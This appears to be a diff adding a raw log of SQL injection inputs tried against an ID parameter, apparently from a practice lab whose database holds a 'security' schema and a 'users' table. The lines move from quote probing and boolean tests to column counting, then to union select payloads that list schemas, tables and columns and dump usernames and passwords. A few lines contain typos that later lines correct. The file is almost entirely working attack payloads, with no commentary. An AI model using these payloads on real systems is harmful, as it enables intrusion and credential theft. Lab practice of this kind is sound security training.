@@ -1,0 +1,99 @@
+ID:2
+ID:2'
+ID:2'
+ID:1
+ID:1\
+ID:1\
+ID:3'
+ID:3'
+ID:3'
+ID:3'
+ID:3'
+ID:3'
+ID:3'
+ID:3
+ID:3'
+ID:3
+ID:3a
+ID:3a
+ID:123
+ID:3?
+ID:3"
+ID:3#
+ID:3#
+ID:3#
+ID:3#
+ID:3#
+ID:3# and 1=1
+ID:3
+ID:3 "
+ID:3'
+ID:3''
+ID:3'''
+ID:3') #
+ID:3') and 1=1 #
+ID:3') and 1=2 #
+ID:3') and 1=1 #
+ID:3') and 1=2 #
+ID:3') order by 4 #
+ID:3') union select 1,group_concat(schema_name),3 from information.schema #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemate #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemate #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schema #
+ID:3') union select 1,group_concat(schema_name),3 from information.schema #
+ID:3') union select 1,group_concat(schema_name),3 from information.schema #
+ID:3') union select 1,group_concat(schema_name),3 from information.schema #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:3') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:3') union select -1,group_concat(schema_name),3 from information_schema.schemata #
+ID:-1') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:-1') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+ID:-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security' #
+ID:-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_names = 'users' #
+ID:-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' #
+ID:-1') union select 1,group_concat(username),password from users  #
+ID:-1') union select 1,group_concat(username),group_concat(password) from users  #
+ID:-1') union select 1,group_concat(username),password from users  #
+ID:-1') union select 1,group_concat(username),3 from users  #
+ID:-1') union select 1,group_concat(username),password from users  #
+ID:-1') union select 1,group_concat(username),password from users limit 0,1 #
+ID:-1') union select 1,group_concat(username),password from users limit 0,1 #
+ID:-1') union select 1,group_concat(username),password from users limit 0,1 #
+ID:-1') union select 1,username,password from users limit 0,1 #
+ID:-1') union select 1,username,password from users  #
+ID:-1') union select 1,group_concat(username),password from users  #
+ID:'
+ID:'
+ID:'
+ID:'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
